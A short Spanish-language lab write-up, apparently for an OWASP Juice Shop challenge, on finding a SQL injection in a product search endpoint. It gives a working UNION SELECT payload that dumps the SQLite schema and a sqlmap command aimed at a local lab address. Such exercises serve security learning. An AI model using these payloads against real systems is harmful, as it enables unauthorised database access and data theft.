# Database Schema
## Exfiltrate the entire DB schema definition via SQL Injection.

En algunas peticiones de los productos se puede ver una url curiosa `/rest/products/search?q=` esto me desperto la curiosidad para intentar ciertos tipos de inyecciones.
Viendo que al usar el parametro `')` desde burpsuite la peticion respondia con un `SQLITE ERROR`.
Descubriendo asi la vulnerabilidad SqlI en esta direccion.
Usando una carga util se puede dumpear el esquema de la base de datos.

```
/rest/products/search?q=test')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, sql FROM sqlite_schema--
```
<img>

____________________________________________________________________

Tambien se podria solo dumpear la info de la base de datos usando sqlamp.

```
sqlmap --url http://172.17.0.3:3000/rest/products?q= --dbs --level=3 --risk=3
```
